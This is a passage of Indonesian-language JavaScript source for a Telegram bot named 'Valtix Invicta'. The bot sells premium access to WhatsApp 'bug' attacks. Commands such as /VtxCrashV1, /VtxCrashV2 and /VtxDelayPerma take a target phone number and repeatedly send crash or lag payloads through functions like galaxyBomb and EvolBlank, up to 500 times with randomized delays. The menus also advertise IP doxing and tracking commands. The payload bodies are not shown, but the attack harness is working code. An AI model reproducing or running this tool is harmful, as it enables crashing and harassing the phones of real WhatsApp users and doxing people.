┌─➤ <b>Valtix Invicta</b>
│ Halo, <b>${username}</b>
│ Terima kasih telah bergabung.
│ Pantau update, info sistem dan
│ project terbaru kami.
│
├─➤ <b>System Card</b>
│ <code>Username : ${username}</code>
│ <code>Developer: @Thaureyo</code>
│ <code>Version  : ONE FILE AUTO-UPDATE</code>
│ <code>Runtime  : ${getBotRuntime()}</code>
│ <code>Prefix   : /</code>
│
└─➤ <i>Powered by Valtix Invicta ⸙</i>
</blockquote>
`,
parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [
      [
        { text: "𝙑𝙏𝙓⌁ 𝙊𝙒𝙉𝙀𝙍", callback_data: "ownermenu" },
        { text: "𝙑𝙏𝙓⌁ 𝙈𝙀𝙉𝙐", callback_data: "menu" }
         ],
      [
        { text: "𝙑𝙏𝙓⌁ 𝘼𝘽𝙊𝙐𝙏", url: "https://t.me/Thaureyo" } 
      ]
    ]
  }
});
  }, 1000);
});

bot.on("callback_query", async (callbackQuery) => {
  try {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const randomVideo = getRandomVid();
    const senderId = callbackQuery.from.id;
    const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
    const username = callbackQuery.from.username ? `@${callbackQuery.from.username}` : "Tidak ada username";
    const date = getCurrentDate(); // tambahkan date agar tidak undefined

    let newCaption = "";
    let newButtons = [];

    if (data === "menu") {
  newCaption = `
<blockquote>📋 COMMAND MENU</blockquote>
Ketik salah satu perintah di bawah ini:

• /attack – Buka halaman bug  
• /downloader – Buka halaman download  
• /search – Buka halaman search
• /group – Buka halaman grup & admin
• /tools – Buka halaman tools kreatif
• /nsfw – Buka halaman 18+ content
• /fun – Buka halaman hiburan & game
• /info – Buka halaman info & system

<blockquote>💡 Ketik command langsung, tanpa tombol.</blockquote>
`;
      newButtons = [
    [{ text: "« Back", callback_data: "mainmenu" }]
  ];

    } else if (data === "ownermenu") {
      newCaption = `
<blockquote>【 𝕍𝔸𝕃𝕋𝕀𝕏 𝕀ℕ𝕍𝕀ℂ𝕋𝔸 — ᴏᴡɴᴇʀ ᴍᴇɴᴜ 】</blockquote>

<blockquote>╭━━〔 ᴘᴀɪʀ / sᴇɴᴅᴇʀ ᴄᴏɴᴛʀᴏʟ 〕━━</blockquote>
ᝰ.ᐟ <code>/addbot 628xx</code>
     ⸙ ʜᴜʙᴜɴɢᴋᴀɴ ɴᴏᴍᴏʀ ᴡᴀ
ᝰ.ᐟ <code>/listprem</code>
     ⸙ ʟɪsᴛ ᴜsᴇʀ ᴘʀᴇᴍɪᴜᴍ
ᝰ.ᐟ <code>/setjeda 5m</code>
     ⸙ ᴀᴛᴜʀ ᴄᴏᴏʟᴅᴏᴡɴ
ᝰ.ᐟ <code>/delprem</code>
     ⸙ ʜᴀᴘᴜs ᴘʀᴇᴍɪᴜᴍ
╰━━━━━━━━━━━━━━━━━━━━━━

<blockquote>╭━━〔 sʏsᴛᴇᴍ ᴄᴏɴᴛʀᴏʟ 〕━━</blockquote>
ᝰ.ᐟ <code>/updatenew</code>
     ⸙ ᴜᴘᴅᴀᴛᴇ & ʀᴇsᴛᴀʀᴛ
ᝰ.ᐟ <code>/restartbot</code>
     ⸙ ʀᴇsᴛᴀʀᴛ ʙᴏᴛ
ᝰ.ᐟ <code>/setmaintenance on/off</code>
     ⸙ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ
╰━━━━━━━━━━━━━━━━━━━━━━

<blockquote>© Valtix-Invicta OFAU</blockquote>
`;
      newButtons = [
        [{ text: "« ᴋᴇᴍʙᴀʟɪ", callback_data: "mainmenu" }]
      ];

    } else if (data === "mainmenu") {
      newCaption = `<blockquote>
┌─➤ <b>Valtix Invicta</b>
│ Halo, <b>${username}</b>
│ Terima kasih telah bergabung.
│ Pantau update, info sistem dan
│ project terbaru kami.
│
├─➤ <b>System Card</b>
│ <code>Username : ${username}</code>
│ <code>Developer: @Thaureyo</code>
│ <code>Version  : ONE FILE AUTO-UPDATE</code>
│ <code>Runtime  : ${getBotRuntime()}</code>
│ <code>Prefix   : /</code>
│
└─➤ <i>Powered by Valtix Invicta ⸙</i>
</blockquote>
      `;
      newButtons = [
[
        { text: "𝙑𝙏𝙓⌁ 𝙊𝙒𝙉𝙀𝙍", callback_data: "ownermenu" },
        { text: "𝙑𝙏𝙓⌁ 𝙈𝙀𝙉𝙐", callback_data: "menu" }
         ],
      [
        { text: "𝙑𝙏𝙓⌁ 𝘼𝘽𝙊𝙐𝙏", url: "https://t.me/Thaureyo" } 
      ]
      ];
    } else {
      return bot.answerCallbackQuery(callbackQuery.id, { text: "Menu tidak dikenal", show_alert: false });
    }

    await bot.editMessageMedia({
      type: "video",
      media: randomVideo,
      caption: newCaption,
      parse_mode: "HTML"
    }, {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: { inline_keyboard: newButtons }
    });

    bot.answerCallbackQuery(callbackQuery.id);
  } catch (err) {
    console.error("Gagal edit media:", err);
    bot.answerCallbackQuery(callbackQuery.id, { text: "Error terjadi", show_alert: false });
  }
}); // <-- Penutup yang benar

/// --- ( Parameter ) --- \\\
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

/// --- ( Case Bug ) --- \\\
bot.onText(/\/VtxLagStorm (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  // --- add maintenance check ---
if (isMaintenance() && !isOwner(userId) && !adminUsers.includes(userId)) {
  return bot.sendVideo(chatId, getRandomVid(), {
    caption: `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
⚠️ Bot sedang dalam mode MAINTENANCE.
Hanya Owner/Admin yang dapat menjalankan perintah saat ini.
`,
    parse_mode: "HTML"
  });
}
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const randomVideo = getRandomVid();
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, getRandomVid(), {
      caption: `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "! Inventor", url: "https://t.me/Thaureyo" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendVideo(chatId, randomVideo, {
    caption: `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : VtxLagStorm
𖥂 Status : Process...
𖥂 Date now : ${date}
╰━───────╯
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : VtxLagStorm
𖥂 Status : Process...
𖥂 Date now : ${date}
╰━───────╯
`,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 10; i++) {
  await galaxyBomb(sock, target);
  await new Promise(r => setTimeout(r, 1500));
}

    console.log(chalk.red(`VALTIX INVICTA ⵢ`));

    await bot.editMessageCaption(
      `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : VtxLagStorm
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}
╰━───────╯
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

bot.onText(/\/VtxDelayPerma (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  // --- add maintenance check ---
if (isMaintenance() && !isOwner(userId) && !adminUsers.includes(userId)) {
  return bot.sendVideo(chatId, getRandomVid(), {
    caption: `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
⚠️ Bot sedang dalam mode MAINTENANCE.
Hanya Owner/Admin yang dapat menjalankan perintah saat ini.
`,
    parse_mode: "HTML"
  });
}
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const randomVideo = getRandomVid();
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, getRandomVid(), {
      caption: `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "! Inventor", url: "https://t.me/Thaureyo" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendVideo(chatId, randomVideo, {
    caption: `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : VtxDelayPerma
𖥂 Status : Process...
𖥂 Date now : ${date}
╰━───────╯
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : VtxDelayPerma
𖥂 Status : Process...
𖥂 Date now : ${date}
╰━───────╯
`,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
for (let i = 0; i < 200; i++) {
  await galaxyBombv2(sock, target);
await new Promise(r => setTimeout(r, 150 + Math.random() * 850));
}

    console.log(chalk.red(`VALTIX INVICTA ⵢ`));

    await bot.editMessageCaption(
      `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : VtxDelayPerma
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}
╰━───────╯
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

bot.onText(/\/VtxCrashV1 (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  // --- add maintenance check ---
if (isMaintenance() && !isOwner(userId) && !adminUsers.includes(userId)) {
  return bot.sendVideo(chatId, getRandomVid(), {
    caption: `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
⚠️ Bot sedang dalam mode MAINTENANCE.
Hanya Owner/Admin yang dapat menjalankan perintah saat ini.
`,
    parse_mode: "HTML"
  });
}
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const randomVideo = getRandomVid();
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, getRandomVid(), {
      caption: `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "! Inventor", url: "https://t.me/Thaureyo" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendVideo(chatId, randomVideo, {
    caption: `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : VtxCrashV1
𖥂 Status : Process...
𖥂 Date now : ${date}
╰━───────╯
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : VtxCrashV1
𖥂 Status : Process...
𖥂 Date now : ${date}
╰━───────╯
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

/// --- ( Forlet JTW-UI 60× acak jeda ) ---
for (let i = 0; i < 60; i++) {
  await JtwCrashUi(sock, target);
  const delay = 2000 + Math.random() * 5000;   // 2-7 detik
  await new Promise(r => setTimeout(r, delay));
}

console.log(chalk.red(`VALTIX INVICTA ⵢ`));

    await bot.editMessageCaption(
      `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙋𝙍𝙊𝙅𝙀𝘾𝙏 𝘿𝘼𝙏𝘼 ⊰━───━╮
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : VtxCrashV1
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}
╰━───────╯
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

bot.onText(/\/VtxCrashV2 (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  // --- add maintenance check ---
if (isMaintenance() && !isOwner(userId) && !adminUsers.includes(userId)) {
  return bot.sendVideo(chatId, getRandomVid(), {
    caption: `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
⚠️ Bot sedang dalam mode MAINTENANCE.
Hanya Owner/Admin yang dapat menjalankan perintah saat ini.
`,
    parse_mode: "HTML"
  });
}
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const randomVideo = getRandomVid();
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, getRandomVid(), {
      caption: `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "! Inventor", url: "https://t.me/Thaureyo" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendVideo(chatId, randomVideo, {
    caption: `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : VtxCrashV2
𖥂 Status : Process...
𖥂 Date now : ${date}
╰━───────╯
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : VtxCrashV2
𖥂 Status : Process...
𖥂 Date now : ${date}
╰━───────╯
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

/// --- ( Forlet ) ---
for (let i = 0; i < 500; i++) {
  await fcinvisotaxFIX(target);        // 1× kirim
  await new Promise(r => setTimeout(r, 600 + Math.random() * 1_400)); // 0.6-2 s random
  if (i % 30 === 0) await new Promise(r => setTimeout(r, 5_000)); // pause 5 detik tiap 30
}

    console.log(chalk.red(`VALTIX INVICTA ⵢ`));

    await bot.editMessageCaption(
      `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : VtxCrashV2
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}
╰━───────╯
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

bot.onText(/\/VtxBlankEvol (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  // --- add maintenance check ---
if (isMaintenance() && !isOwner(userId) && !adminUsers.includes(userId)) {
  return bot.sendVideo(chatId, getRandomVid(), {
    caption: `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
⚠️ Bot sedang dalam mode MAINTENANCE.
Hanya Owner/Admin yang dapat menjalankan perintah saat ini.
`,
    parse_mode: "HTML"
  });
}
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const randomVideo = getRandomVid();
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, getRandomVid(), {
      caption: `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "! Inventor", url: "https://t.me/Thaureyo" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendVideo(chatId, randomVideo, {
    caption: `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : VtxBlankEvol
𖥂 Status : Process...
𖥂 Date now : ${date}
╰━───────╯
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : VtxBlankEvol
𖥂 Status : Process...
𖥂 Date now : ${date}
╰━───────╯
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

/// --- ( Forlet ) --- \\\
for (let i = 0; i < 500; i++) {              // turun dr 100, tetep gacor
  await EvolBlank(sock, target);
  await new Promise(r => setTimeout(r, 600 + Math.random() * 900)); // 600-1.500 ms
}

    console.log(chalk.red(`VALTIX INVICTA ⵢ`));

    await bot.editMessageCaption(
      `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : VtxBlankEvol
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}
╰━───────╯
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

/// --------- ( Plungi ) --------- \\\

/// --- ( case add bot ) --- \\\
bot.onText(/^\/search$/, async msg => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // opsional hapus command & pesan lama
  try { await bot.deleteMessage(chatId, msg.message_id) } catch {}
  const prev = lastMsg.get(userId);
  if (prev) try { await bot.deleteMessage(chatId, prev) } catch {}

  const pic = getRandomVid();

  const sent = await bot.sendVideo(chatId, pic, {
    caption: `
<blockquote>╭▄︻デ𝔖𝔈𝔄ℜℭℌ═══━一</blockquote>

<blockquote>━━━【𝗠𝘂𝘀𝗶𝗸】━━━</blockquote>
  ✧ /spotifysearch ⸙  
  ╰➤ search lagu Spotify  
  ✧ /song ⸙  
  ╰➤ detail + link Spotify  
  ✧ /play ⸙  
  ╰➤ download lagu Spotify  

<blockquote>━━━【𝗦𝗼𝘀𝗶𝗮𝗹 & 𝗩𝗶𝗱𝗲𝗼】━━━</blockquote>
  ✧ /ttsearch ⸙  
  ╰➤ search video TikTok  
  ✧ /xnxxsearch ⸙  
  ╰➤ search video XNXX  
  ✧ /xvideosearch ⸙  
  ╰➤ search XVideos  
  ✧ /happymodsearch ⸙  
  ╰➤ search APK mod  
  ✧ /snackvideos ⸙  
  ╰➤ profil & video SnackVideo  

<blockquote>━━━【𝗜𝗻𝗳𝗼 & 𝗨𝘁𝗶𝗹】━━━</blockquote>
  ✧ /trackip ⸙  
  ╰➤ info IP address  
  ✧ /trackipcyber ⸙  
  ╰➤ lacak IP detail  
  ✧ /doxipcyber ⸙  
  ╰➤ doxing IP  
  ✧ /negarainfo ⸙  
  ╰➤ data negara  
  ✧ /maps ⸙  
  ╰➤ kirim lokasi Google Maps  

<blockquote>━━━【𝗕𝗲𝗿𝗶𝘁𝗮 & 𝗧𝗿𝗲𝗻𝗱】━━━</blockquote>
  ✧ /beritaindo ⸙  
  ╰➤ berita Indonesia  
  ✧ /dunia ⸙  
  ╰➤ berita dunia  
  ✧ /trending ⸙  
  ╰➤ topik trending Google  
  ✧ /gempa ⸙  
  ╰➤ info gempa BMKG  

<blockquote>© Valtix-Invicta OFAU</blockquote>
`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [{ text: "« ᴋᴇᴍʙᴀʟɪ", callback_data: "mainmenu" }]
      ]
    }
  });

  lastMsg.set(userId, sent.message_id);
});

bot.onText(/^\/downloader$/, async msg => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // opsional hapus command & pesan sebelumnya
  try { await bot.deleteMessage(chatId, msg.message_id) } catch {}
  const prev = lastMsg.get(userId);
  if (prev) try { await bot.deleteMessage(chatId, prev) } catch {}

  const pic = getRandomVid();

  const sent = await bot.sendVideo(chatId, pic, {
    caption: `
<blockquote>╭▄︻デ𝔇𝔒𝔚𝔑𝔏𝔒𝔄𝔇𝔈ℜ═══━一</blockquote>

<blockquote>━━━【𝗧𝗶𝗸𝗧𝗼𝗸】━━━</blockquote>
  ✧ /tiktokdl ⸙  
  ╰➤ download video TikTok  

<blockquote>━━━【𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺】━━━</blockquote>
  ✧ /ig ⸙  
  ╰➤ download post/reel IG  

<blockquote>━━━【𝗢𝘁𝗵𝗲𝗿𝘀】━━━</blockquote>
  ✧ /terabox ⸙  
  ╰➤ download file TeraBox  
  ✧ /saveweb ⸙  
  ╰➤ backup web → zip  
  ✧ /getcode ⸙  
  ╰➤ ambil source web

<blockquote>━━━【𝗔𝘂𝘁𝗼】━━━</blockquote>
  ✧ Kirim link YT/FB/TW/IG/SC/MediaFire  
  ╰➤ otomatis download!  

<blockquote>© Valtix-Invicta OFAU</blockquote>
`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [{ text: "« ᴋᴇᴍʙᴀʟɪ", callback_data: "mainmenu" }]
      ]
    }
  });

  lastMsg.set(userId, sent.message_id);
});

bot.onText(/^\/tools$/, async msg => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try { await bot.deleteMessage(chatId, msg.message_id) } catch {}
  const prev = lastMsg.get(userId);
  if (prev) try { await bot.deleteMessage(chatId, prev) } catch {}

  const pic = getRandomVid();

